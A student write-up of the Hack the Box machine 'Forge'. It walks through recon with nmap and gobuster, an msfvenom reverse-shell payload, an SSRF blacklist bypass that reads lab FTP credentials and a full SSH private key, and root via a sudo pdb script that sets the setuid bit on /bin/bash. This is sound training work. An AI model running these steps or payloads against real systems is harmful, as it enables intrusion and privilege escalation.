# Writeup Hack the Box - Forge

At the classes *Zaawansowane testy penetracyjne* in Wroclaw University of Science and Technology we were supposed to solve the machine from Hack the Box. We chose *Forge*. This write-up was made in cooperation with [TheArqsz](https://github.com/TheArqsz) and [Tacola320](https://github.com/Tacola320).

![forge_logo](./images/logo.png) 

After launching, an IP address has appeared - `10.10.11.111`. The first action we took was adding this IP address to `/etc/hosts` file.

![etc_hosts](./images/etc_hosts.png)

# Reconnaissance 
We took a glance at the main page of the website to see whether it was loaded properly and what was inside.

![main_page](./images/main_page.png)

Then we started investigating what was under this web application.
At first we used `nmap` to scan for open ports and version of services working there.

`sudo nmap -sV -p- -oN nmap.log 10.10.11.111`

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-17 15:45 EDT
Nmap scan report for 10.10.11.111
Host is up (0.047s latency).
Not shown: 65532 closed ports
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open     http    Apache httpd 2.4.41
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds
```

Nmap displayed that it had got 3 open ports: 
- 21/tcp - ftp
- 22/tcp - ssh
- 80/tcp - http

It also detected versions of ssh and http, which have got known vulnerabilities:
 - https://www.cybersecurity-help.cz/vdb/openssh/openssh/8.2p1/
 - https://httpd.apache.org/security/vulnerabilities_24.html

Then we have proceeded to enumerate subdirectories with `gobuster`.

 `gobuster dir -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --url http://forge.htb`

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://forge.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/fluffy/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/10/17 15:54:18 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/] 
/upload               (Status: 200) [Size: 929]                                
Progress: 20165 / 220561 (9.14%)                                              ^C
[!] Keyboard interrupt detected, terminating.
                                                                               
===============================================================
2021/10/17 15:56:08 Finished
===============================================================
```

We have interupted enumerating, due to subdirectories that allowed us to look into the content.

We also used Burpsuite to see if any interesting HTTP headers in responses were sent. Below presented is response on request to `http://forge.htb/upload`. We have only confirmed that the server is working on Apache 2.4.41. 

```
HTTP/1.1 200 OK
Date: Sat, 23 Oct 2021 18:56:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 929
```

At the end of this part, we launched `ffuf` to enumerate subdomains. 

`ffuf -w shubs-subdomains.txt -u http://forge.htb/ -H "Host: FUZZ.forge.htb" -fl 10  `
```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://forge.htb/
 :: Wordlist         : FUZZ: shubs-subdomains.txt
 :: Header           : Host: FUZZ.forge.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response lines: 10
________________________________________________

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
```

It showed us nothing but one subdomain. Although, after entering `http://admin.forge.htb/`, we got information that webpage did not exist. 

# Upload page
We decided to investigate files in `http://forge.htb/static`. We found folder `images` and we believed there could have been files uploaded from `http://forge.htb/upload`. That is why we focused on that webpage. 

We tried to upload some image to find out how the webpage would behave.

![picture_upload](./images/picture_uploaded.png)

We were shown an URL informing where it was saved (please note that, URLs are generated randomly). After clicking this, we were redirected to the previously uploaded picture.

![cocker](./images/cocker_preview.png)

We can also see that these files were saved in different directory - `/uploads`.

While previewing folder `/uploads`, the webpage responded with HTTP 404 status code.

# Reverse Shell
Since accessing images was possible, we tried to upload reverse shell. We used `msfvenom` to create staged reverse shell.

`msfvenom -p linux/x86/shell/reverse_tcp LHOST=<local ip address> LPORT=4444 -f elf > reverse_payload.elf`.

We managed to upload it. We also set listener but no session was created.

# Back to upload functions
We took a step back to analyse  another functionality - `Upload from url`.

At first we entered `http://127.0.0.1/`, but the webpage printed that the URL is blacklisted. 

![blacklist](./images/blacklist.png)

Then we used our previous finding and entered `http://admin.forge.htb/`, but the result was the same. We still wanted to bypass those restrictions. We tried using capital letters - `http://ADMIN.FORGE.HTB/`. The upload was successful.

![admin_forge](./images/ADMINFORGE.png)

However the content contained errors as it is shown below.

![admin_corrupted](./images/ADMINFORGE_error.png)

That seemed intriguing to us, so we dug further. We used `curl` trying to view this page in CLI.

`curl http://forge.htb/uploads/9Trq5nq7AVUlCGY3xlYv`

And that was a good shot. We noted another subdirectory, which was not found by Gobuster - `/announcements`.

```
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

So now we uploaded `http://ADMIN.FORGE.HTB/announcements` and used the same steps as previous.

`curl http://forge.htb/uploads/RRX4ERDRkIdBANfkSQnn`

```
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

Another interesting discovery. We got information that `/upload` endpoint was not securely configured and it was possible to pass any URL with `?u=` parameter. We also got credentials to ftp service `user:heightofsecurity123!`.

So we tried to connect to ftp server with CLI, but it was unsuccessful. 

Another way of connecting to ftp service is via URL. We used hints found earlier, crafted link and entered it in `Upload from url`.

`http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB`

Success! We again used `curl` to view the results. 

`curl http://forge.htb/uploads/pXIiTW5bTo8eTzobeRDZ`

```
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Oct 23 15:51 user.txt
```

There was a list of files with user flag. So we tried to view it. We crafted another URL.

`http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/user.txt`

`curl http://forge.htb/uploads/CBmRE8MMsKJSQ9617yKf`

```
475da2567a83228c12e8333a2df36bcc
```

First flag successfuly found. We wanted to find a root flag as well.

We decided to look for some other files via ftp. At first we were looking for ssh keys, because we found that the port 22/tcp was open.
We crafted URL shown below and put it into upload page.
`http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/.ssh/id_rsa`

`curl http://forge.htb/uploads/jExL9yzwhJKj3jFP72p5`

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAnZIO+Qywfgnftqo5as+orHW/w1WbrG6i6B7Tv2PdQ09NixOmtHR3
rnxHouv4/l1pO2njPf5GbjVHAsMwJDXmDNjaqZfO9OYC7K7hr7FV6xlUWThwcKo0hIOVuE
7Jh1d+jfpDYYXqON5r6DzODI5WMwLKl9n5rbtFko3xaLewkHYTE2YY3uvVppxsnCvJ/6uk
r6p7bzcRygYrTyEAWg5gORfsqhC3HaoOxXiXgGzTWyXtf2o4zmNhstfdgWWBpEfbgFgZ3D
WJ+u2z/VObp0IIKEfsgX+cWXQUt8RJAnKgTUjGAmfNRL9nJxomYHlySQz2xL4UYXXzXr8G
mL6X0+nKrRglaNFdC0ykLTGsiGs1+bc6jJiD1ESiebAS/ZLATTsaH46IE/vv9XOJ05qEXR
GUz+aplzDG4wWviSNuerDy9PTGxB6kR5pGbCaEWoRPLVIb9EqnWh279mXu0b4zYhEg+nyD
K6ui/nrmRYUOadgCKXR7zlEm3mgj4hu4cFasH/KlAAAFgK9tvD2vbbw9AAAAB3NzaC1yc2
EAAAGBAJ2SDvkMsH4J37aqOWrPqKx1v8NVm6xuouge079j3UNPTYsTprR0d658R6Lr+P5d
aTtp4z3+Rm41RwLDMCQ15gzY2qmXzvTmAuyu4a+xVesZVFk4cHCqNISDlbhOyYdXfo36Q2
GF6jjea+g8zgyOVjMCypfZ+a27RZKN8Wi3sJB2ExNmGN7r1aacbJwryf+rpK+qe283EcoG
K08hAFoOYDkX7KoQtx2qDsV4l4Bs01sl7X9qOM5jYbLX3YFlgaRH24BYGdw1ifrts/1Tm6
dCCChH7IF/nFl0FLfESQJyoE1IxgJnzUS/ZycaJmB5ckkM9sS+FGF1816/Bpi+l9Ppyq0Y
JWjRXQtMpC0xrIhrNfm3OoyYg9REonmwEv2SwE07Gh+OiBP77/VzidOahF0RlM/mqZcwxu
MFr4kjbnqw8vT0xsQepEeaRmwmhFqETy1SG/RKp1odu/Zl7tG+M2IRIPp8gyurov565kWF
DmnYAil0e85RJt5oI+IbuHBWrB/ypQAAAAMBAAEAAAGALBhHoGJwsZTJyjBwyPc72KdK9r
rqSaLca+DUmOa1cLSsmpLxP+an52hYE7u9flFdtYa4VQznYMgAC0HcIwYCTu4Qow0cmWQU
xW9bMPOLe7Mm66DjtmOrNrosF9vUgc92Vv0GBjCXjzqPL/p0HwdmD/hkAYK6YGfb3Ftkh0
2AV6zzQaZ8p0WQEIQN0NZgPPAnshEfYcwjakm3rPkrRAhp3RBY5m6vD9obMB/DJelObF98
yv9Kzlb5bDcEgcWKNhL1ZdHWJjJPApluz6oIn+uIEcLvv18hI3dhIkPeHpjTXMVl9878F+
kHdcjpjKSnsSjhlAIVxFu3N67N8S3BFnioaWpIIbZxwhYv9OV7uARa3eU6miKmSmdUm1z/
wDaQv1swk9HwZlXGvDRWcMTFGTGRnyetZbgA9vVKhnUtGqq0skZxoP1ju1ANVaaVzirMeu
DXfkpfN2GkoA/ulod3LyPZx3QcT8QafdbwAJ0MHNFfKVbqDvtn8Ug4/yfLCueQdlCBAAAA
wFoM1lMgd3jFFi0qgCRI14rDTpa7wzn5QG0HlWeZuqjFMqtLQcDlhmE1vDA7aQE6fyLYbM
0sSeyvkPIKbckcL5YQav63Y0BwRv9npaTs9ISxvrII5n26hPF8DPamPbnAENuBmWd5iqUf
FDb5B7L+sJai/JzYg0KbggvUd45JsVeaQrBx32Vkw8wKDD663agTMxSqRM/wT3qLk1zmvg
NqD51AfvS/NomELAzbbrVTowVBzIAX2ZvkdhaNwHlCbsqerAAAAMEAzRnXpuHQBQI3vFkC
9vCV+ZfL9yfI2gz9oWrk9NWOP46zuzRCmce4Lb8ia2tLQNbnG9cBTE7TARGBY0QOgIWy0P
fikLIICAMoQseNHAhCPWXVsLL5yUydSSVZTrUnM7Uc9rLh7XDomdU7j/2lNEcCVSI/q1vZ
dEg5oFrreGIZysTBykyizOmFGElJv5wBEV5JDYI0nfO+8xoHbwaQ2if9GLXLBFe2f0BmXr
W/y1sxXy8nrltMVzVfCP02sbkBV9JZAAAAwQDErJZn6A+nTI+5g2LkofWK1BA0X79ccXeL
wS5q+66leUP0KZrDdow0s77QD+86dDjoq4fMRLl4yPfWOsxEkg90rvOr3Z9ga1jPCSFNAb
RVFD+gXCAOBF+afizL3fm40cHECsUifh24QqUSJ5f/xZBKu04Ypad8nH9nlkRdfOuh2jQb
nR7k4+Pryk8HqgNS3/g1/Fpd52DDziDOAIfORntwkuiQSlg63hF3vadCAV3KIVLtBONXH2
shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
-----END OPENSSH PRIVATE KEY-----
```

We created a copy of the ssh private key to our system andnamed it `id_rsa`. After that we gave relevant permissions to file to make it usable.

`chmod 600 id_rsa` 

Now we tried to log in into ssh with the same username as ftp and private key.

`ssh -i id_rsa user@forge.htb`

```
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 23 Oct 2021 08:10:13 PM UTC

  System load:  0.01              Processes:             231
  Usage of /:   44.5% of 6.82GB   Users logged in:       1
  Memory usage: 35%               IPv4 address for eth0: 10.10.11.111
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Oct 23 17:42:15 2021 from 10.10.14.210
user@forge:~$ 

```
And we got in. We were looking for anything that we could execute with sudo permissions without providing a password.

```
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Before executing this file, we wanted to take a look at what was inside.

`cat /opt/remote-manage.py`

```
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

In this file we could find a password - `secretadminpassword` and that the script was using python debugger. Having looked into the file, we noticed that after inputing some illegal characters, python shell should be spawned. That could allow us to write our own script with root privileges. It was launched on random port in range from 1025 to 65535. So we needed another ssh session to connect to this port.

We executed this script.

```
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:26816
```

We also opened another ssh session and connected to that port with `nc`. 

```
user@forge:~$ nc localhost 26816
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
```

After typing in random data (exluding numbers from 1 to 4), we pressed enter and switched to the first ssh session, where script was running. We got an error and opportunity to write our own script. So we set setuid bit, to run `/bin/bash` with root permissions.

```
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:26816
invalid literal for int() with base 10: b'user@forge:~$ nc localhost 26816\nEnter the secret passsword: secretadminpassword'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system('chmod u+s /bin/bash`)
*** SyntaxError: EOL while scanning string literal
(Pdb) os.system('chmod u+s /bin/bash')
0
(Pdb) 
```

Then we exited python shell and executed `/bin/bash -p`.

```
user@forge:~$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# 
```

We obtained what we were looking for, so we went to `/root` folder to see a root flag.

```
bash-5.0# cd /root
bash-5.0# ls
clean-uploads.sh  root.txt  snap
bash-5.0# cat root.txt
7a6202344ae2d7f37840e91b2f1ec499
bash-5.0# 
```

After getting root flag, we could state that the machine was solved entirely (user and root flag were obtained).